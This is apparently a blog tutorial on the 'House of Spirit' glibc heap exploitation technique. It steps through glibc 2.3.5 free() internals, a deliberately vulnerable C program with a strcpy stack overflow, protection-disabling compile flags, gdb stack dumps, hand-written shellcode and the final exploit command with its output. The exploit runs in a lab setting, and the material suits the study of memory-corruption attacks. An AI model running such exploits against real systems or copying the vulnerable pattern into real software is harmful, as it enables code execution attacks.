Ingredients:  

* The attacker can control a location of memory higher than the one he’s trying to change: the exact location depends on the fake size of the chunk we’re free-ing (see third point)
* A stack overflow that allows to overwrite a variable containing a chunk address returned by a malloc() call
* The aforementioned chunk is freed
* Another chunk is allocated
* The attacker can control the content of this last chunk

So, for the first time, the main goal is not to overwrite the metadata of an allocated chunk, but to control the argument passed to its subsequent free() call. In fact, the result of this operation is that an arbitrary address is linked into a fastbin. Another malloc() call would return such address as a chunk of memory: if the attacker can write into this area of memory, then he’ll be able to overwrite important values for the execution flow.  

The problem, now, is to decide what this pointer should be overflowed with. In order to correctly look like a fake chunk, it needs a good chunk size field (which is located 4 bytes before the pointer value). Also, as it needs to trigger the fastbin code, it’s required that the size must be less than av->max_fast (set to 64 + 8 by default) AND equal to the normalized size that the following malloc() will request (i.e. the malloc‘s argument + 8). In the end, the stored return address (or whichever thing we’d like to overwrite) needs to be located no more than 64 bytes away from this size field.  

Once the free() is called, the following code (glibc 2.3.5 line #[3368](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=e3ccbde7b5b84affbf6ff2387a5151310235f0a3;hb=1afdd17390f6febdfe559e16dfc5c5718f8934aa#l3368)) is executed:  
``` c
 void
public_fREe(Void_t* mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  [...]

  p = mem2chunk(mem);

#if HAVE_MMAP
  if (chunk_is_mmapped(p))                       /* release mmapped memory. */
  {
    munmap_chunk(p);
    return;
  }
#endif

  ar_ptr = arena_for_chunk(p);

  [...]

  _int_free(ar_ptr, mem);
```
In this context, mem is the overflowed value we changed, which is transformed into a pointer to the chunk. In order to correctly go on, the size field must not have the IS_MMAPPED and the NON_MAIN_ARENA bits set. If so, the _int_free function is called:  
``` c
 void
_int_free(mstate av, Void_t* mem)
{
  mchunkptr       p;           /* chunk corresponding to mem */
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr*    fb;          /* associated fastbin */

  [...]

  p = mem2chunk(mem);
  size = chunksize(p);

  [...]

  /*
    If eligible, place chunk on a fastbin so it can be found
    and used quickly in malloc.
  */

  if ((unsigned long)(size) <= (unsigned long)(av->max_fast)

#if TRIM_FASTBINS
      /*
	If TRIM_FASTBINS set, don't place chunks
	bordering top into fastbins
      */
      && (chunk_at_offset(p, size) != av->top)
#endif
      ) {

    if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
			     >= av->system_mem, 0))
      {
	errstr = "free(): invalid next size (fast)";
	goto errout;
      }

    [...]
    fb = &(av->fastbins[fastbin_index(size)]);
    [...]
    p->fd = *fb;
    *fb = p;
  }
```
In this segment of code, if the size field was set to a value smaller than 64, the fastbin code is triggered. As you can see, there’s that suspicious if that checks for the size of the chunk next to the one we’re freeing. As the fake chunk’s size must be big enough to include the stored return address (or whatever else we’re trying to overwrite), the size of the chunk next to the fake one must be over the location of the stored return address. 

If everything goes fine, then the fake chunk’s address will be put into a fastbin and the next malloc() request (which will be fulfilled by the fake size we set) will return it, allowing the attacker to do its job.  

As usual, blackngel, in his “[Malloc Des-Maleficarum](http://phrack.org/issues/66/10.html)“, provided us an example that perfectly matches the requirements:  
``` c

 /*
 * blackngel's vulnerable program slightly modified by gb_master
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void fvuln(char *str1, int age)
{
  char *ptr1, name[32];
  int local_age;
  char *ptr2;

  local_age = age;

  ptr1 = (char *) malloc(256);
  printf("\nPTR1 = [ %p ]", ptr1);
  strcpy(name, str1);
  printf("\nPTR1 = [ %p ]\n", ptr1);

  free(ptr1);

  ptr2 = (char *) malloc(40);

  snprintf(ptr2, 40-1, "%s is %d years old", name, local_age);
  printf("\n%s\n", ptr2);
}

int main(int argc, char *argv[])
{
  int pad[10] = {0, 0, 0, 0, 0, 0, 0, 10, 0, 0};

  if (argc == 3)
    fvuln(argv[1], atoi(argv[2]));

  return 0;
}
```
It’s clear that the strcpy on name using a user-defined input allows to overwrite the value of ptr1. Then, at the end, snprintf allows the attacker to write into ptr2 and to complete the exploit. About the modifications I did:   

* I don’t know why blackngel put a static attribute to both ptr1 and name variables. Anyway, I removed it, as I was not comfortable into having these variables in the .bss area.
* The pad into the main function is required for two reasons:
	- Allow a correct 8-bit alignment for the fake chunk ptr1
	- Have a valid size value for the next chunk check in the free (I actually tried with a smaller pad, but ptr1‘s value was ending with \x20 on my machine and I was unable to pass this value in the shellcode)

In order to have everything working, I had to:  

* Disable ASLR with the usual echo command
* Boot the kernel with the noexec=off parameter
* Disable GCC’s stack protections

About the third point, it all reduces to:

 `gcc hos.c -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -mno-accumulate-outgoing-args -z execstack -o hos`  
So, the first thing to do is to overwrite ptr1‘s value: I will use, for the age parameter, the same value blackngel used in the original paper (48). Now we need a good value for ptr1.    
```
 $ ./hos `python -c 'import sys; sys.stdout.write("A2 + "B" * 4 + "C" * 4)'` 48

PTR1 = [ 0x804b008 ]
PTR1 = [ 0x43434343 ]
Segmentation fault
```
Right after the strcpy the stack looks like this:  
```
 (gdb) x/40x 0xffffcef0
0xffffcef0:     0x00000000      0xffffcf60      0x08048625      0x41414141
0xffffcf00:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffcf10:     0x41414141      0x41414141      0x41414141      0x42424242
0xffffcf20:     0x43434343      0x00000000      0xffffcf68      0x080486c0
0xffffcf30:     0xffffd19e      0x00000030      0x00000000      0x00000000
0xffffcf40:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcf50:     0x00000000      0x0000000a      0x00000000      0x00000000
0xffffcf60:     0xf7e5d000      0x00000000      0x00000000      0xf7cdd943
0xffffcf70:     0x00000003      0xffffd004      0xffffd014      0xf7feb05e
0xffffcf80:     0x00000003      0xffffd004      0xffffcfa4      0x0804a014

PTR1      -> 0xFFFFCF20
PTR2      -> 0xFFFFCF1C (??)
local_age -> 0xFFFFCF24 (sadly overwritten with a NUL character)
EBP       -> 0xFFFFCF28
RET       -> 0xFFFFCF2C
name      -> 0xFFFFCEFC
```
I don’t know how or why GCC decided to put ptr2 between name and ptr1, but this won’t change much the things. Ok, so, ptr1 needs to be set to local_age + 4 (0xFFFFCF28): in this way, the chunk’s address will be 0xFFFFCF20, and its size field will be right where local_age is stored. We need, anyway, to overwrite local_age with its good value (48 in this scenario), as the strcpy destroyed its assigned value by putting the string terminator character there.  

So, the new command line will look like this:  
`./hos` `python -c 'import sys; sys.stdout.write("A2 + "B" * 4  + "\x28\xCF\xFF\xFF" + "\x30")'` `48` 
Once ptr1 gets the value 0xFFFFCF28 and the malloc() is called again, the value 0xFFFFCF28 will be assigned to ptr2 again. As the return value is stored at 0xFFFFCF2C, this means that the bytes 4-7 of name (the variable that is going to be copied inside ptr2 through an sprintf) need to be set to the desired return value: in our case it’s the beginning of a shellcode stored inside the name variable itself (i.e. the address of name: 0xFFFFCEFC).  

As the space inside the name array is very small for my good-old “Pwned!” shellcode, I had to shrink it and adapt to this scenario. Sadly, I had to shorten the printed string to a simple “Pwn”.  
``` asm
 section .text

global _start

_start:
        xor     eax, eax
	jmp     tricky_end

        db      0xFC, 0xCE, 0xFF, 0xFF    ; the new RET value

tricky_start:
        mov     al, 4
        xor     ebx, ebx
        inc     ebx
        pop     ecx
        xor     edx, edx
        mov     dl, 3
        int     0x80
        mov     al, 1
        int     0x80
tricky_end:
        call    tricky_start
        db      'Pwn'
```
```
 $ objdump -d pwn -M intel  

pwn:     file format elf32-i386


Disassembly of section .text:

08048080 :
 8048080:       31 c0                   xor    eax,eax
 8048082:       eb 14                   jmp    8048098 
 8048084:       fc                      cld    
 8048085:       ce                      into   
 8048086:       ff                      (bad)  
 8048087:       ff b0 04 31 db 43       push   DWORD PTR [eax+0x43db3104]

08048088 :
 8048088:       b0 04                   mov    al,0x4
 804808a:       31 db                   xor    ebx,ebx
 804808c:       43                      inc    ebx
 804808d:       59                      pop    ecx
 804808e:       31 d2                   xor    edx,edx
 8048090:       b2 03                   mov    dl,0x3
 8048092:       cd 80                   int    0x80
 8048094:       b0 01                   mov    al,0x1
 8048096:       cd 80                   int    0x80

08048098 :
 8048098:       e8 eb ff ff ff          call   8048088 
 804809d:       50                      push   eax
 804809e:       77 6e                   ja     804810e <tricky_end+0x76>
```
Putting all together, we get the expected result:  
```
 $ ./hos `python -c 'import sys; sys.stdout.write("\x31\xc0\xeb\x14\xfc\xce\xff\xff\xb0\x04\x31\xdb\x43\x59\x31\xd2\xb2\x03\xcd\x80\xb0\x01\xcd\x80\xe8\xeb\xff\xff\xff\x50\x77\x6eB" * 4 + "\x28\xCF\xFF\xFF" + "\x30")'` 48
PTR1 = [ 0x804b008 ]
PTR1 = [ 0xffffcf28 ]

1�������1�CY1Ҳ̀�̀�����Pwn(���(�
Pwn$
```
And that’s actually it: the House of Spirit. This post concludes my trip into the paper that introduced glibc’s heap overflows to the world. I showed how some of the tricks described in it still work nowadays and this has been a lot of fun for me and I really hope you had some when reading all this stuff.  